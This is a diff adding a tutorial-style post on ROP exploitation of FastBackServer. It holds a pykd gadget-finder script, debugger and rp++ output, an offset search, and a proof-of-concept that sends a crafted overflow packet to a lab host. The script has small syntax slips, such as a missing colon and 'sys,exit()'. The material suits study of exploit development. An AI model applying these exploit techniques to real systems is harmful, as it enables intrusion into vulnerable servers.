+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> b <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xc2</span>]:
+</span></span><span style="display:flex;"><span>             ptr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>             retn<span style="color:#f92672">.</span>append(ptr)
+</span></span><span style="display:flex;"><span>             ptr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> log(<span style="color:#e6db74">&#34;Found </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> ret instructions&#34;</span> <span style="color:#f92672">%</span> len(retn))
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> retn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">formatInstr</span>(instr, mod):
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Replace address with modbase+offset.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param instr: instruction string from disasm.instruction()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param mod: module object from getModule
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: formatted instruction string: modbase+offset instruction
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> address <span style="color:#f92672">=</span> int(instr[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span> offset <span style="color:#f92672">=</span> address <span style="color:#f92672">-</span> mod<span style="color:#f92672">.</span>begin()
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">+0x</span><span style="color:#e6db74">%x</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (mod<span style="color:#f92672">.</span>name(), offset, instr[<span style="color:#ae81ff">9</span>:])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disasmGadget</span>(addr, mod, fp)
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Find gadgets. Start from a ret instruction and crawl back from 1 to
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> MAX_GADGET_SIZE bytes. At each iteration disassemble instructions and
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> make sure the result gadget has no invalid instruction and is still
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ending with a ret.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param addr: address of a ret instruction
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param mod: module object from getModule
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param fp: file object to log found gadgets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: number of gadgets found starting from a specific address
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, MAX_GADGET_SIZE):
+</span></span><span style="display:flex;"><span>     gadget <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>     ptr <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> i
+</span></span><span style="display:flex;"><span>     dasm <span style="color:#f92672">=</span> disasm(ptr)
+</span></span><span style="display:flex;"><span>     gadget_size <span style="color:#f92672">=</span> dasm<span style="color:#f92672">.</span>length()
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">while</span> gadget_size <span style="color:#f92672">&lt;=</span> MAX_GADGET_SIZE:
+</span></span><span style="display:flex;"><span>         instr <span style="color:#f92672">=</span> dasm<span style="color:#f92672">.</span>instruction()
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> any(bad <span style="color:#f92672">in</span> instr <span style="color:#66d9ef">for</span> bad <span style="color:#f92672">in</span> BAD):
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>         gadget<span style="color:#f92672">.</span>append(instr)
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> instr<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;ret&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>         dasm<span style="color:#f92672">.</span>disasm()
+</span></span><span style="display:flex;"><span>         gadget_size <span style="color:#f92672">+=</span> dasm<span style="color:#f92672">.</span>length()
+</span></span><span style="display:flex;"><span>     matching <span style="color:#f92672">=</span> [i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> gadget <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;ret&#34;</span> <span style="color:#f92672">in</span> i]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> matching:
+</span></span><span style="display:flex;"><span>         count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>         fp<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">86</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">for</span> instr <span style="color:#f92672">in</span> gadget:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                fp<span style="color:#f92672">.</span>write(str(instr) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">UnicodeEncodeError</span>:
+</span></span><span style="display:flex;"><span>                print(str(repr(instr)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> count
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">63</span>)
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;# findrop.py pykd Gadget Discovery module #&#34;</span>)
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">63</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>     modname <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
+</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Syntax: findrop.py modulename [MAX_GADGET_SIZE]&#34;</span>)
+</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Example: findrop.py ntdll 8&#34;</span>)
+</span></span><span style="display:flex;"><span>     sys<span style="color:#f92672">.</span>exit()
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>     MAX_GADGET_SIZE <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">ValueError</span>:
+</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Syntax: findrop.py modulename [MAX_GADGET_SIZE]&#34;</span>)
+</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Example: findrop.py ntdll 8&#34;</span>)
+</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;MAX_GADGET_SIZE needs to be an integer&#34;</span>)
+</span></span><span style="display:flex;"><span>     sys,exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> mod <span style="color:#f92672">=</span> getModule(modname)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> mod:
+</span></span><span style="display:flex;"><span>     pages <span style="color:#f92672">=</span> findExecPages(mod)
+</span></span><span style="display:flex;"><span>     retn  <span style="color:#f92672">=</span> findRetn(pages)
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> retn:
+</span></span><span style="display:flex;"><span>         fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;C:/tools/pykd/findrop_output.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
+</span></span><span style="display:flex;"><span>         fp<span style="color:#f92672">.</span>write(HEADER)
+</span></span><span style="display:flex;"><span>         start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;Gadget discovery started...&#34;</span>)
+</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">for</span> ret <span style="color:#f92672">in</span> retn:
+</span></span><span style="display:flex;"><span>             count <span style="color:#f92672">+=</span> disasmGadget(ret, mod, fp)                        
+</span></span><span style="display:flex;"><span>         fp<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>         end <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;Gadget discovery ended (</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> secs).&#34;</span> <span style="color:#f92672">%</span> int(end<span style="color:#f92672">-</span>start))
+</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;Found </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> gadgets in </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.&#34;</span> <span style="color:#f92672">%</span> (count, mod<span style="color:#f92672">.</span>name()))
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>         log(<span style="color:#e6db74">&#34;ret instructions not found!&#34;</span>)
+</span></span></code></pre></div><p>The maximum number of bytes to subtract depends on the length of ROP gadgets we want.</p>
+<p>Example of using the tool in WinDb, with a default of 8 bytes length. First we load it, and then we use the custom script we created to find ROP gadgets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span>  .load pykd
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>py C:<span style="color:#960050;background-color:#1e0010">\</span>Tools<span style="color:#960050;background-color:#1e0010">\</span>pykd<span style="color:#960050;background-color:#1e0010">\</span>findropfull.py
+</span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># findrop.py pykd Gadget Discovery module #
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#f92672">+</span>] Syntax: findrop.py modulename [MAX_GADGET_SIZE]
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Example: findrop.py ntdll <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>py C:<span style="color:#960050;background-color:#1e0010">\</span>Tools<span style="color:#960050;background-color:#1e0010">\</span>pykd<span style="color:#960050;background-color:#1e0010">\</span>findropfull.py FastBackServer
+</span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># findrop.py pykd Gadget Discovery module #
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">###############################################################
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#f92672">+</span>] Total Memory Pages: <span style="color:#ae81ff">2060</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Executable Memory Pages: <span style="color:#ae81ff">637</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Found <span style="color:#ae81ff">13155</span> ret instructions
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Gadget discovery started...
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">004</span>bb6fb e105            loope   FastBackServer<span style="color:#f92672">!</span>std<span style="color:#f92672">::</span>pair<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">const</span> ,<span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;::~</span>pair<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocat<span style="color:#960050;background-color:#1e0010">\</span>x00쓐<span style="color:#960050;background-color:#1e0010">۽쑙Ơ쓐۽쓤۽䡻厨\</span>uffff<span style="color:#960050;background-color:#1e0010">\</span>uffff쓰<span style="color:#960050;background-color:#1e0010">۽\</span>udc81北<span style="color:#960050;background-color:#1e0010">\</span>ue5b0ࡦ<span style="color:#960050;background-color:#1e0010">\</span>udc81北쑡Ơ<span style="color:#960050;background-color:#1e0010">⻐\</span>u07fc츨߯씔<span style="color:#960050;background-color:#1e0010">۽䡋厨\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00씠<span style="color:#960050;background-color:#1e0010">۽힗匋뛻</span>K<span style="color:#960050;background-color:#1e0010">\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00얱Ơ玈ӏ㔰Ӛ츨߯<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">004</span>bbf4b e110            loope   FastBackServer<span style="color:#f92672">!</span>std<span style="color:#f92672">::</span>map<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span>,<span style="color:#66d9ef">char</span>,std<span style="color:#f92672">::</span>less<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>basic_string<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>,std<span style="color:#f92672">::</span>char_traits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span><span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span>uns<span style="color:#960050;background-color:#1e0010">\</span>x00쓐<span style="color:#960050;background-color:#1e0010">۽쑙Ơ쓐۽쓤۽䡻厨\</span>uffff<span style="color:#960050;background-color:#1e0010">\</span>uffff쓰<span style="color:#960050;background-color:#1e0010">۽\</span>udc81北<span style="color:#960050;background-color:#1e0010">\</span>ue5b0ࡦ<span style="color:#960050;background-color:#1e0010">\</span>udc81北쑡Ơ<span style="color:#960050;background-color:#1e0010">⻐\</span>u07fc츨߯씔<span style="color:#960050;background-color:#1e0010">۽䡋厨\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00씠<span style="color:#960050;background-color:#1e0010">۽힗匋뽋</span>K<span style="color:#960050;background-color:#1e0010">\</span>x00<span style="color:#960050;background-color:#1e0010">\</span>x00얱Ơ玈ӏ㝠Ӛ츨߯<span style="color:#960050;background-color:#1e0010">⻐\</span>u07fc앤<span style="color:#960050;background-color:#1e0010">۽攧厧\</span>x01<span style="color:#960050;background-color:#1e0010">\</span>x00앰<span style="color:#960050;background-color:#1e0010">۽氬匎뽋&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">00630</span>c8b e100            loope   FastBackServer<span style="color:#f92672">!</span>std<span style="color:#f92672">::</span>map<span style="color:#f92672">&lt;</span>ChainStatsKey_t,ChainStatisticsDef,std<span style="color:#f92672">::</span>less<span style="color:#f92672">&lt;</span>ChainStatsKey_t<span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span>ChainStatisticsDef<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;::~</span>map<span style="color:#f92672">&lt;</span>ChainStatsKey_t,ChainStatisticsDef,std<span style="color:#f92672">::</span>less<span style="color:#f92672">&lt;</span>ChainStatsKey_t<span style="color:#f92672">&gt;</span>,std<span style="color:#f92672">::</span>allocator<span style="color:#f92672">&lt;</span>ChainStatisticsD<span style="color:#960050;background-color:#1e0010">\</span>x00쓐<span style="color:#960050;background-color:#1e0010">۽쑙Ơ쓐۽쓤۽䡻厨\</span>uffff<span style="color:#960050;background-color:#1e0010">\</span>uffff쓰<span style="color:#960050;background-color:#1e0010">۽\</span>udc81北<span style="color:#960050;background-color:#1e0010">\</span>ue5b0ࡦ<span style="color:#960050;background-color:#1e0010">\</span>udc81<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Gadget discovery <span style="color:#a6e22e">ended</span> (<span style="color:#ae81ff">10</span> secs).
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Found <span style="color:#ae81ff">30368</span> gadgets in FastBackServer.
+</span></span></code></pre></div><p>The TXT file with the ROP gadgets can be queried (and grepped) to find for the ROP gadgets we want.</p>
+<h1 id="our-first-rop-exploit">Our first ROP exploit</h1>
+<p>Let&rsquo;s use the FastBackServer exploit proof of concept:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># psAgentCommand  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> bytearray([<span style="color:#ae81ff">0x41</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">0xC</span>)  
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x534</span>) <span style="color:#75715e"># opcode  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># 1st memcpy: offset  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x500</span>) <span style="color:#75715e"># 1st memcpy: size field  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># 2nd memcpy: offset  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x100</span>) <span style="color:#75715e"># 2nd memcpy: size field  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># 3rd memcpy: offset  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;i&#34;</span>, <span style="color:#ae81ff">0x100</span>) <span style="color:#75715e"># 3rd memcpy: size field  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> bytearray([<span style="color:#ae81ff">0x41</span>]<span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>)  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># psCommandBuffer  </span>
+</span></span><span style="display:flex;"><span>formatString <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;File: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> From: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> To: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> ChunkLoc: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> FileLoc: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>  
+</span></span><span style="display:flex;"><span>(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x200</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>)  
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> formatString  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Checksum  </span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> pack(<span style="color:#e6db74">&#34;&gt;i&#34;</span>, len(buf)<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> buf  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():  
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;192.168.122.113&#34;</span> 
+</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> <span style="color:#ae81ff">11460</span>  
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)  
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((server, port))  
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(buf)  
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()  
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+] Packet sent&#34;</span>)  
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:  
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Let&rsquo;s find the specific offset to crash the buffer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">512</span> -q 41326a41 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">276</span>
+</span></span></code></pre></div><p>At 276 bytes we start overriding EIP.</p>
+<p>If we dump the value that ESP has (stack pointer) we find that it is at offset 280.
+<strong>This means that ESP points right after the return address</strong>. It is good because we added a offset to override the EIP, and, the following bytes will be pointed by ESP.</p>
+<h3 id="rp-for-rop-gadget-search">RP++ for ROP gadget search</h3>
+<p>This tool will increase our speed compared to the PYKD tool.
+The rp++ tool is a series of open source C++ applications written in C+ and provide support for both 32-bit and 64-bit CPUs.
+The various compiled executables can run on Windows, Linux, MacOS and can locate gadgets in PE Files, ELF files and Mach-O files.</p>
+<p>Besides supporting a wide array of operating systems, rp++ does not run inside the debugger, but rather works directly on the file system. This provides a massive speed increase and is one of the reasons we prefer it.</p>
+<p>We just use the executable targeting the application and a output file to store the results of the search (always <strong>filtering by a gadget length</strong>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>user<span style="color:#960050;background-color:#1e0010">\</span>Desktop<span style="color:#960050;background-color:#1e0010">\</span>rp<span style="color:#f92672">-</span>win<span style="color:#f92672">&gt;</span>rp<span style="color:#f92672">-</span>win<span style="color:#f92672">-</span>x86.exe <span style="color:#f92672">-</span>f FastBackServer.exe <span style="color:#f92672">-</span>r <span style="color:#ae81ff">5</span> <span style="color:#f92672">&gt;</span> rop.txt
+</span></span></code></pre></div><p>This is an output example of the tool:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Trying to open <span style="color:#960050;background-color:#1e0010">&#39;</span>FastBackServer.exe<span style="color:#960050;background-color:#1e0010">&#39;</span>..
+</span></span><span style="display:flex;"><span>Loading PE information..
+</span></span><span style="display:flex;"><span>FileFormat: PE, Arch: Ia32
+</span></span><span style="display:flex;"><span>Using the Nasm syntax..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Wait a few seconds, rp<span style="color:#f92672">++</span> is looking <span style="color:#66d9ef">for</span> gadgets..
+</span></span><span style="display:flex;"><span>in .text
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">211283</span> found.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A total of <span style="color:#ae81ff">211283</span> gadgets found.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00547b94</span><span style="color:#f92672">:</span> aaa  ; adc dword [eax], eax ; add esp, <span style="color:#ae81ff">0x08</span> ; mov ecx, dword [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x00000328</span>] ; mov dword [ecx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x00000208</span>], <span style="color:#ae81ff">0x00000C04</span> ; call dword [<span style="color:#ae81ff">0x0067E494</span>] ;  (<span style="color:#ae81ff">1</span> found)
